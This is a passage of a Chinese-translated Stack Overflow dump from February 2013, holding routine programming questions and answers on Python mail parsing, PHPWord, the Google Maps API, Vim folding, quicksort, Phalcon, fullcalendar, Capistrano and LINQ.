    padding: 3px 5px 0px 0px;
}
.myContainer .myPaddingA
{
    padding-left: 44px;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:38:11.350

如果是想法，我通常如何将我的 div 水平居中是我将容器设置为某个 % 宽度。然后我使用边距：自动；希望有帮助。

# python - 确定 Maildir 文件夹中唯一的“发件人”电子邮件地址

> ID：14903664
> 
> 赞同：1
> 
> 时间：2013-02-15T21:33:39.657
> 
> 标签：python, email, maildir

我想在 Maildir 文件夹中找出“发件人”地址的列表。使用以下脚本，它说明了在 From 中有效的各种格式：

```
import mailbox

mbox = mailbox.Maildir("/home/paul/Maildir/.folder") 
for message in mbox:
    print message["from"]

"John Smith" <jsmith@domain.com>
Tony <tony@domain2.com>
brendang@domain.net 
```

对于任何有效（或常见）“发件人：”字段格式，我只需要电子邮件地址。这之前一定已经解决了无数次，所以我期待一个图书馆。我能找到的只是各种正则表达式。

有标准方法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-15T21:40:42.970

[email.utils.parseaddr](http://docs.python.org/release/2.6/library/email.util.html#email.utils.parseaddr)是你的朋友：

```
>>> emails = """"John Smith" <jsmith@domain.com>
Tony <tony@domain2.com>
brendang@domain.net"""
>>> lines = emails.splitlines()
>>> from email.utils import parseaddr
>>> [parseaddr(email)[1] for email in lines]
['jsmith@domain.com', 'tony@domain2.com', 'brendang@domain.net'] 
```

所以你应该能够使用：

```
for message in mbox:
    print parseaddr(message['from']) 
```

然后，我想如果您只想要唯一的电子邮件地址，那么您可以直接使用 a `set`，`mbox`例如：

```
mbox = mailbox.MailDir('/some/path')
uniq_emails = set(parseaddr(email['from'])[1] for email in mbox) 
```

# php - PHPWord Addpage 方法未命中

> ID：14903667
> 
> 赞同：1
> 
> 时间：2013-02-15T21:33:41.127
> 
> 标签：php, phpword

我正在尝试使用 PHPWord。但是当我尝试插入此代码行时

```
$document->AddPage(); 
```

我收到以下错误...

```
Fatal error: Call to undefined method PHPWord_Template::AddPage() in C:\xampp\htdocs\Anderen\PHPWord\Testtemplate.php on line 37 
```

当我在包含的`PHPWord.php`文件中搜索时，我找不到 Addpage 方法，所以我不怀疑它不起作用。但我的问题是，我该如何解决这个问题？我已经用最新版了...

谢谢，奥利维尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:44:22.477

您正在寻找 Section 对象的 addPageBreak() 方法

**编辑**

```
require_once 'PHPWord.php'; 
$PHPWord = new PHPWord(); 
$section = $PHPWord->createSection();

$tenant_arr = array("Mark","Baker"); 
$j = 0; 
foreach($tenant_arr as $value) {
    $section->addText($value);
    $section->addPageBreak();
}
$objWriter = PHPWord_IOFactory::createWriter($PHPWord, 'RTF');
$objWriter->save('myWordFile.rtf'); 
```

# javascript - 将标记添加到路径 Google Maps API v3 的起点和终点

> ID：14903669
> 
> 赞同：0
> 
> 时间：2013-02-15T21:33:51.190
> 
> 标签：javascript, html, google-maps, google-maps-api-3

我正在尝试在 Google 地图上实现一些寻求的自定义方向服务。我有一堆预制路径，我根据两个下拉框中的选择隐藏和显示。到目前为止效果很好。但是，我想在路径的开始和结束处添加标记，我该怎么做呢？

![路径，我想在路径的开始和结束处添加一个标记。](../Images/e2b1f2f144c28d316474d2592ea16ed4.png)

这是一个工作示例[http://jsfiddle.net/PwFDM/](http://jsfiddle.net/PwFDM/)

```
<!DOCTYPE html>
<html>

    <head>
        <meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
        <style type="text/css">
            html {
                height: 100%
            }
            body {
                height: 100%;
                margin: 0;
                padding: 0
            }
            #map_canvas {
                height: 100%
            }
        </style>
        <script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=AIzaSyD9W-wEHa5KzvcntFzGgyTwWtx4wvrs0os&sensor=true">

        </script>
    </head>

    <body>
        <div><strong>Start: </strong>

            <select id="start">
                <option>Building 1</option>
                <option>Building 2</option>
                <option>Building 3</option>
                <option>Building 4</option>
                <option>Building 5</option>
                <option>Building 6</option>
                <option>Building 7</option>
                <option>Building 8</option>
            </select> <strong>End:</strong> 
            <select id="end">
                <option>Building 1</option>
                <option>Building 2</option>
                <option>Building 3</option>
                <option>Building 4</option>
                <option>Building 5</option>
                <option>Building 6</option>
                <option>Building 7</option>
                <option>Building 8</option>
            </select>
            <input type="button" onclick="drawDirections();" value="GO" />
        </div>
        <div id="map" style="width: 100%; height: 100%"></div>
        <script type="text/javascript">
            var mapOptions = {
                mapTypeId: google.maps.MapTypeId.ROADMAP,
                center: new google.maps.LatLng(51.507684, 0.063686),
                zoom: 17
            };
            var map = new google.maps.Map(document.getElementById("map"), mapOptions);

            // Predefine all the paths
            var paths = [];

            paths['1_to_2'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.508445, 0.063944),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507457, 0.064019)],
                strokeColor: '#FF0000'
            });
            paths['1_to_3'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.508445, 0.063944),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507494, 0.063399)],
                strokeColor: '#FF0000'
            });
            paths['1_to_4'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.508445, 0.063944),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507709, 0.063301)],
                strokeColor: '#FF0000'
            });
            paths['1_to_5'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.508445, 0.063944),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.50747, 0.062659),
                new google.maps.LatLng(51.507501, 0.062467)],
                strokeColor: '#FF0000'
            });
            paths['1_to_6'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.508445, 0.063944),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507275, 0.062455)],
                strokeColor: '#FF0000'
            });
            paths['1_to_7'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.508445, 0.063944),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507275, 0.062455)],
                strokeColor: '#FF0000'
            });
            paths['1_to_8'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.508445, 0.063944),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507248, 0.065797),
                new google.maps.LatLng(51.507449, 0.065805),
                new google.maps.LatLng(51.507442, 0.066004)],
                strokeColor: '#FF0000'
            });

            //---------------------------------------------------------
            paths['2_to_3'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507457, 0.064019),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507494, 0.063399)],
                strokeColor: '#FF0000'
            });
            paths['2_to_4'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507457, 0.064019),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507709, 0.063301)],
                strokeColor: '#FF0000'
            });
            paths['2_to_5'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507457, 0.064019),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.50747, 0.062659),
                new google.maps.LatLng(51.507501, 0.062467)],
                strokeColor: '#FF0000'
            });
            paths['2_to_6'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507457, 0.064019),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507275, 0.062455)],
                strokeColor: '#FF0000'
            });
            paths['2_to_7'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507457, 0.064019),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507275, 0.062455)],
                strokeColor: '#FF0000'
            });
            paths['2_to_8'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507457, 0.064019),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507248, 0.065797),
                new google.maps.LatLng(51.507449, 0.065805),
                new google.maps.LatLng(51.507442, 0.066004)],
                strokeColor: '#FF0000'
            });

            //---------------------------------------------------------
            paths['3_to_4'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507494, 0.063399),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507709, 0.063301)],
                strokeColor: '#FF0000'
            });
            paths['3_to_5'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507494, 0.063399),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.50747, 0.062659),
                new google.maps.LatLng(51.507501, 0.062467)],
                strokeColor: '#FF0000'
            });
            paths['3_to_6'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507494, 0.063399),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507275, 0.062455)],
                strokeColor: '#FF0000'
            });
            paths['3_to_7'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507494, 0.063399),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507275, 0.062455)],
                strokeColor: '#FF0000'
            });
            paths['3_to_8'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507494, 0.063399),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507248, 0.065797),
                new google.maps.LatLng(51.507449, 0.065805),
                new google.maps.LatLng(51.507442, 0.066004)],
                strokeColor: '#FF0000'
            });

            //-------------------------------------------------------------
            paths['4_to_5'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507709, 0.063301),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.50747, 0.062659),
                new google.maps.LatLng(51.507501, 0.062467)],
                strokeColor: '#FF0000'
            });
            paths['4_to_6'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507709, 0.063301),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507275, 0.062455)],
                strokeColor: '#FF0000'
            });
            paths['4_to_7'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507709, 0.063301),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507275, 0.062455)],
                strokeColor: '#FF0000'
            });
            paths['4_to_8'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507709, 0.063301),
                new google.maps.LatLng(51.507474, 0.063877),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507248, 0.065797),
                new google.maps.LatLng(51.507449, 0.065805),
                new google.maps.LatLng(51.507442, 0.066004)],
                strokeColor: '#FF0000'
            });

            //---------------------------------------------------------------
            paths['5_to_6'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507501, 0.062467),
                new google.maps.LatLng(51.50747, 0.062659),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507275, 0.062455)],
                strokeColor: '#FF0000'
            });
            paths['5_to_7'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507501, 0.062467),
                new google.maps.LatLng(51.50747, 0.062659),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507275, 0.062455)],
                strokeColor: '#FF0000'
            });
            paths['5_to_8'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507501, 0.062467),
                new google.maps.LatLng(51.50747, 0.062659),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507248, 0.065797),
                new google.maps.LatLng(51.507449, 0.065805),
                new google.maps.LatLng(51.507442, 0.066004)],
                strokeColor: '#FF0000'
            });

            //----------------------------------------------------
            paths['6_to_7'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507275, 0.062455),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507275, 0.062455)],
                strokeColor: '#FF0000'
            });
            paths['6_to_8'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507275, 0.062455),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507248, 0.065797),
                new google.maps.LatLng(51.507449, 0.065805),
                new google.maps.LatLng(51.507442, 0.066004)],
                strokeColor: '#FF0000'
            });

            //--------------------------------------------------------
            paths['7_to_8'] = new google.maps.Polyline({
                path: [
                new google.maps.LatLng(51.507275, 0.062455),
                new google.maps.LatLng(51.507293, 0.062681),
                new google.maps.LatLng(51.507287, 0.063839),
                new google.maps.LatLng(51.507248, 0.065797),
                new google.maps.LatLng(51.507449, 0.065805),
                new google.maps.LatLng(51.507442, 0.066004)],
                strokeColor: '#FF0000'
            });

            function drawDirections() {
                var start = 1 + document.getElementById('start').selectedIndex;
                var end = 1 + document.getElementById('end').selectedIndex;
                var i;

                if (start === end) {
                    alert('Please choose different buildings');
                } else {
                    // Hide all polylines
                    for (i in paths) {
                        paths[i].setOptions({
                            map: null
                        });
                    }

                    // Show the route
                    if (typeof paths['' + start + '_to_' + end] !== 'undefined') {
                        paths['' + start + '_to_' + end].setOptions({
                            map: map
                        });
                    } else if (typeof paths['' + end + '_to_' + start] !== 'undefined') {
                        paths['' + end + '_to_' + start].setOptions({
                            map: map
                        });
                    }

                    var laLatLng = new google.maps.LatLng(51.507684, 0.063686);
                    map.panTo(laLatLng);
                    map.setZoom(17);
                    //panTo(latLng:LatLng)
                }
            }
        </script>
    </body>

</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T23:07:55.730

要在路径的每一端添加一个标记，请执行以下操作：

```
 paths['' + start + '_to_' + end].setOptions({
      map: map
  });
  // first point of polyline
  createMarker(paths['' + start + '_to_' + end].getPath().getAt(0), 'start', 'start', 'green'); 
  // last point of polyline
  createMarker(paths['' + start + '_to_' + end].getPath().getAt(paths['' + start + '_to_' + end].getPath().getLength()-1), 'end', 'end', 'red'); 
```

[jsfiddle](http://jsfiddle.net/PwFDM/7/)

# asp.net - ASP.NET - Mono - PostgreSQL - 无法建立连接 [0x00101]

> ID：14903674
> 
> 赞同：1
> 
> 时间：2013-02-15T21:33:59.093
> 
> 标签：asp.net, apache, mono, npgsql, mod-mono

几天来一直试图让我的 asp.net 应用程序在 mono 下连接到我的 PostgreSQL 数据库，但无济于事。可以在 IIS 下连接到它，但不能在 Apache 和 Mono 下连接。

ASP.NET 部分工作正常，只是与数据库的连接不太好。

我收到以下错误：

```
Description: HTTP 500\. Error processing request.

Stack Trace:

System.Exception: Failed to establish a connection to '127.0.0.1'.
  at Npgsql.NpgsqlClosedState.Open (Npgsql.NpgsqlConnector context) [0x00101] in /Users/fxjr/Desenvolvimento/ProjetosOpenSource/Npgsql/NpgsqlSourceRelease/Npgsql2/src/Npgsql/NpgsqlClosedState.cs:171 
Version information: Mono Runtime Version: 2.10.8 (tarball Fri Jul 20 23:48:09 UTC 2012); ASP.NET Version: 4.0.30319.1 
```

版本：Fedora 18、Mono 2.10.8、Apache 2.2.23、Npgsql 2.0.12

最终将在其上运行的生产服务器当前是带有 Apache 2.2.x 的 RHEL。

谢谢

# macros - 什么是宏“不保存”命令？

> ID：14903675
> 
> 赞同：0
> 
> 时间：2013-02-15T21:34:01.017
> 
> 标签：macros

我可以使用以下命令阻止 PDF 或任何文件打开：

```
OpenAfterExport:=False 
```

有谁知道抑制`'Don't Save'`提示的命令？

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T22:28:49.223

对于 excel，有几种方法可以“隐藏”或“抑制”保存提示。

```
ThisWorkBook.Saved = True 
```

和

```
Application.DisplayAlerts = False 
```

都将禁用保存提示出现。但是，后者有其自身的问题，例如，如果您有其他问题，我相信这些消息也会被禁用，这可能是有问题的。在这两个之后，您可以添加一个

```
ActiveWorkBook.Close 
```

关闭工作簿。

您可以在一行中完成所有这些操作

```
ActiveWorkbook.Close savechanges:=False 
```

如果您需要保存工作簿，请确保在该代码行之前添加一段代码以自动保存。

希望有帮助。如果这不是您要查找的内容，请详细说明，我会再试一次。

# java - Google Talk 是否支持 XMPP 多用户聊天？

> ID：14903678
> 
> 赞同：7
> 
> 时间：2013-02-15T21:34:22.210
> 
> 标签：java, xmpp, google-apps, smack, google-talk

我正在使用 Smack 在 Java/Spark 中开发一个内部仪表板，该仪表板将在 LDAP 用户组之间启动 Google Talk 会议。当我跑

```
MultiUserChat.isServiceEnabled(connection, "user@mydomain.com") 
```

它返回假。我知道通过 GMail 客户端，可以开始群聊。这是否会因为我的 Google Apps 域中的某些内容而返回 false，或者 Google 是否使用其他方式在 Google Talk 中进行群聊？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-20T22:04:25.833

事实证明，GTalk 实际上*确实*支持 MUC。使用 Smack 和 Java，就像下面的代码一样简单：

```
 UUID uid = UUID.randomUUID();
 String chatRoomName = String.format("private-chat-%1s@%2s", uid, "groupchat.google.com");
 MultiUserChat muc = new MultiUserChat(connection, chatRoomName);
 muc.join("My username"); 
```

从那里开始，只需添加类似的用户

```
 muc.invite("someguy@somedomain.tld", "Some reason"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-16T00:03:14.527

不，截至今天，没有 Google Talk 客户端支持 XEP-45 多用户聊天 (MUC)，Google Talk 也没有宣布 XMPP MUC 组件。¹

Google 的所有 Google Talk 客户端都不支持 MUC，这是您检查的内容`MultiUserChat.isServiceEnabled()`。但是，如果用户通过 Google Talk 使用第三方 XMPP 客户端（例如 Gajim），那么他可以像任何其他 XMPP 用户一样加入 MUC 房间。

另请参阅 Google productforums 上的此问题：[http ://productforums.google.com/forum/#!topic/chat/HLyMGBxJM7Q](http://productforums.google.com/forum/#!topic/chat/HLyMGBxJM7Q)

¹但是有一个。[看到这个答案](https://stackoverflow.com/a/14990811/194894)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-06-26T03:03:54.230

我发现这个：<a href="https://bugs.freedesktop.org/attachment.cgi?id=27687" rel="nofollow noreferrer">Google Talk 多用户聊天规范

它显示了 Talk 和 XMPP 规范之间的一些差异。希望在 talk.google.com 服务上创建或加入私人 MUC 房间的第三方客户需要遵循这些规范。

1.  房间名称必须遵循 private-chat-GUID@groupchat.google.com 的特定格式。

2.  从客户端到talk.google.com 的状态广播必须包含一个实体能力元素。

3.  如果用户希望更改他们在房间内的昵称，客户端必须在发送带有新昵称的出席信息节之前将旧昵称设置为不可用。

Sure Talk 支持 XMPP。

# vim - Scilab 的 Vim 代码折叠

> ID：14903684
> 
> 赞同：2
> 
> 时间：2013-02-15T21:34:45.457
> 
> 标签：vim, scilab, code-folding

我最近才开始使用 vim 的折叠功能，它对它非常适用的语言非常有帮助。

我的问题在于 vim 注释掉 scilab 代码中折叠标记的方式。它默认为

```
/*{{{*/ and /*}}}*/ 
```

它在 C 等语言中效果很好，但实际上并不是 scilab 中的注释。尝试运行代码时出现乘法错误。

我试过添加

```
autocmd FileType scilab set fmr=//{{{,//}}} 
```

到我的 .vimrc 文件，它并没有完全符合我的要求。结果是

```
/*//{{{*/ and /*//}}}*/ 
```

这仍然不是评论。代码“折叠”很好，但变得无法使用。我可以设置一个宏来用“//”替换“/*”的每个实例，但是当全局应用于文件时，这可能会产生意想不到的后果。

所以问题是：我如何为 scilab 文件设置 vim 折叠标记注释，这样它不会使文件不可用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-16T08:40:48.200

您不向`'foldmarker'`自身添加注释，有一个`'commentstring'`选项会影响 Vim 如何围绕折叠标记（使用 创建折叠时`zf`）。尝试设置

```
:setlocal commentstring=//%s 
```

为您的*scilab*文件类型。（输入命令`~/.vim/after/ftplugin/scilab.vim`使其永久化。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T22:06:44.953

在我看来，vim 不理解 SciLab 注释的工作原理。我不确定这些天 vim 是否带有 SciLab 语法逻辑，您的 SciLab 文件中的语法是否正确突出显示？如果没有，您可以从[此处](http://www.vim.org/scripts/script.php?script_id=396)获取语法文件。

您想使用标记有什么特别的原因吗？实际上并不需要它们。如果您不希望 vim 按语法或缩进级别自动折叠，您仍然可以手动定义折叠

```
:set foldmethod=manual 
```

这使您可以在可视模式下选择一大块文本并使用“zf”将其折叠起来。不需要标记。

有关各种 vim 折叠技术的更多信息，请[点击此处](http://vim.wikia.com/wiki/Folding)。

# java - 快速排序 - StackOverflowException

> ID：14903687
> 
> 赞同：1
> 
> 时间：2013-02-15T21:34:52.680
> 
> 标签：java, algorithm, quicksort

我正在尝试编写一个快速排序算法。请看下面的代码：

```
public static void quickSort(int[] tab, int lowIndex, int highIndex) {
    if (tab.length == 0 || tab == null) {
        return;
    }

    int i = lowIndex;
    int j = highIndex;

    int pivot = tab[tab.length / 2];

    while (i <= j) {
        while (tab[i] < pivot) {
            i++;
        }
        while (tab[j] > pivot) {
            j--;
        }

        if (i <= j) {
            int c = tab[i];
            tab[i] = tab[j];
            tab[j] = c;
            i++;
            j--;
        }

        if (lowIndex < j) {
            quickSort(tab, lowIndex, j); // error !!!
        }
        if (i < highIndex) {
            quickSort(tab, i, highIndex);
        }
    }

} 
```

问题是线程“main”java.lang.StackOverflowError 中的异常。怎么了 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:41:41.973

这是错误的：

```
int pivot = tab[tab.length / 2]; 
```

您必须在提供的切片中找到枢轴，而不是在`tab`.

```
int pivot = tab[lowIndex + (highIndex - lowIndex)/ 2]; 
```

此外，您终止递归的条件是错误的。桌子的长度不会改变。你必须检查是否`lowIndex >= highIndex`

# phalcon - 在 ORM 顺序中保留 IN 的顺序

> ID：14903689
> 
> 赞同：0
> 
> 时间：2013-02-15T21:35:07.893
> 
> 标签：phalcon

我正在尝试进行查询，在其中保留 IN 语句中的 ID 顺序。我似乎无法使用 Model Manage Query Builder 或标准的 ORM 'order' 数组参数来做到这一点。我错过了什么吗？我不断得到：

```
UNEXPECTED TOKEN IDENTIFIER(, NEAR TO 'id`enter code here`,17743,16688,16650 
```

这是我的模型经理：

```
$query = $this->modelsManager->createQuery('SELECT * FROM Projects WHERE id IN ('.implode(',', array_keys($finalIterations)).')
                    ORDER BY FIELD(id,'.implode(',', array_keys($finalIterations)).''); 
```

很明显 PhQL 不喜欢 FIELD 关键字。有没有办法让我用 PhQL 做我想做的事情？看来我将无法做我需要做的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-01-22T15:08:58.547

不幸的是，如前所述，这在 Phalcon 中缺少一个功能。

看看这个函数，我把它放到了我的*ModelBase*抽象类中，它是我所有模型的父类。它使用 PhQL 变量绑定，因此可以安全地处理直接用户输入。

您可以重新实现自定义*\Phalcon\Mvc\Model\Criteria*但这个解决方案似乎更容易使用，至少对我来说。

* * *

**模型库摘要**

```
public function appendCustomOrder( \Phalcon\Mvc\Model\CriteriaInterface &$criteria, $orderField, array &$orderValues = [] ) {
    if(!empty($orderValues)) {
        $queryKeys = $bindParams = [];
        foreach($orderValues as $key => $id) {
            $queryKey = 'pho'.$key;
            $queryKeys[] = ':'.$queryKey.':';
            $bindParams[$queryKey] = $id;
        }

        // TODO: add support for multiple orderBy fields
        $criteria->orderBy('FIELD('.$orderField.','.implode(',',$queryKeys).')');
        // there's no 'addBind' function, need to merge old parameters with new ones
        $criteria->bind( array_merge( (array) @$criteria->getParams()['bind'], $bindParams ) );
    }
} 
```

* * *

**控制器使用**

```
$projectIDs = [17743, 16688, 16650];
$projectsModel = new Projects();

$criteria = $projectsModel->query->inWhere( 'id', $projectIDs );
$projectsModel->appendCustomOrder( $criteria, 'id', $projectIDs );

$projectsData = $criteria->execute(); 
```

这将生成类似于以下的有效 PhQL 语法：

```
SELECT `projects`.`id` AS `id`, `projects`.`title` AS `title` 
FROM `projects` 
WHERE `projects`.`id` IN (:phi0, :phi1, :phi2) 
ORDER BY FIELD(`projects`.`id`, :pho0, :pho1, :pho2) 
```

# javascript - 如何让 fullcalendar 进行两次选择？

> ID：14903691
> 
> 赞同：0
> 
> 时间：2013-02-15T21:35:16.667
> 
> 标签：javascript, jquery, fullcalendar

我想在日历中进行两个选择。现在我只能制作一个用于我的输入之一。

我正在尝试在日历上选择一个日期，然后第一个选择转到我的第一个输入标签。

然后在那之后我想选择一个不同的日期去我的第二个输入标签。

所以基本上，我想做两个选择。这是我的代码。我需要在这里的某个地方进行回调吗？我把我的代码放在[jsfiddle](http://jsfiddle.net/stasis/RRyME/)上。

```
 var calendar = $('#calendar').fullCalendar({
        header: {
            left: 'prev,next today',
            center: 'title',
            right: 'month'
        },
        selectable: true,
        selectHelper: true,
        select: function(start, end, allDay) {
            var title = 'true';
            if (title === 'true') {
                calendar.fullCalendar('renderEvent',
                    {
                        title: title,
                        start: start,
                        end: end,
                        allDay: allDay
                    },
                    true // make the event "stick"
                );
            var eventStart = $.fullCalendar.formatDate(start, "MM/dd/yyyy");
            var eventEnd = $.fullCalendar.formatDate(end, "MM/dd/yyyy");
            $('input[name="startDate"]').val(eventStart);
            }
            calendar.fullCalendar('unselect');
        },
        eventClick: function(calEvent, jsEvent, view) {
            $('#calendar').fullCalendar('removeEvents', calEvent._id);
            $('input[name="startDate"]').removeAttr('value');
            $('input[name="endDate"]').removeAttr('value');
        },
        editable: true
    }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T22:07:48.450

除非我不理解你的问题，否则这样做怎么样？

```
if($('input[name="startDate"]').val()=='') {
   $('input[name="startDate"]').val(eventStart);
} else {
   $('input[name="endDate"]').val(eventEnd);
} 
```

[JSFIDDLE](http://jsfiddle.net/RRyME/5/)

# deployment - rvm：从 cap deploy 中找不到命令

> ID：14903693
> 
> 赞同：0
> 
> 时间：2013-02-15T21:35:22.697
> 
> 标签：deployment, installation, rvm, capistrano, bundle

希望这个问题对某人有所帮助，但无论如何我对答案很感兴趣。运行时出现此错误

```
cap deploy 
```

在它给出的其他输出中：

```
rvm: command not found 
```

我用谷歌搜索并尝试了许多黑客，除此之外没有任何效果：

```
run "source ~/.rvm/scripts/rvm && cd #{deploy_to} && bundle && ..." 
```

这样我就可以执行任何东西，比如 bundle 等。问题是我必须在每次运行开始时指定它，或者正如你所看到的，用 && 在一行中分隔命令。

我的问题是，我怎样才能让它正常工作？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T09:17:06.493

您应该使用 RVM - Capistrano 集成 gem => [https://github.com/wayneeseguin/rvm-capistrano#readme](https://github.com/wayneeseguin/rvm-capistrano#readme)

# linq - 如何将列组合在一起

> ID：14903694
> 
> 赞同：0
> 
> 时间：2013-02-15T21:35:29.390
> 
> 标签：linq, lambda

我有 2 个包含不同数据但具有相似列的列表。基本上我想加入这些列表，然后将相似的列合并为 1。

```
var listCombo= List1.Where(a=>DataIds.Contains(a.dataId)).DefaultIfEmpty()
    .Join(List2,
    list1 => list1.key,
    list2 => list2.key,
    (L1,L2) => new
    {
        L2.key,
        L2.dataId,
        L2.dataValue,
        L2.date,
        L1.secId,
        L1.dataId,
        L1.dataValue
    }); 
```

我想将 dataId 和 dataValue 列组合在一起。我怎么做？

所以我可以只说 listCombo.dataId 或 listCombo.dataValue 而不必唯一地命名它们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:48:18.733

我会对 list1、list2 和第三个列表使用 POCO 方法，第三个列表是两者的组合。我敢肯定，如果你组合不同的类型，你会做适当的转换，或者如果你想要复杂的类型，你可以将它们定义为它们自己的属性，或者不是。

```
 static void Main(string[] args)
        {
            List<A> lisA = new List<A> {new A {AId = 1, AName = "Brett"}, new A {AId = 2, AName = "John"}};
            List<B> lisB = new List<B> {new B { BId = 1, BName = "Doe" }, new B { BId = 2, BName = "Howard" } };

            List<C> lisC = lisA.Join(lisB,
                                     list1 => list1.AId,
                                     list2 => list2.BId,
                                     (L1, L2) => new C
                                         {
                                             CId = L1.AId,
                                             CName = L1.AName + " " + L2.BName
                                         }).ToList();

            lisC.ForEach(
                n => Console.WriteLine(n.CName + "\n")
                );

        }

        public class A
        {
            public int  AId { get; set; }
            public string AName { get; set; }
        }

        public class B
        {
            public int BId { get; set; }
            public string BName { get; set; }
        }

        public class C
        {
            public int CId { get; set; }
            public string CName { get; set; }
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T22:28:00.020

如果我理解您的问题，您正在尝试将这两个字段合并为一个。假设你有一个`Class`

```
public class List1 {
public int dataId {get;set;}
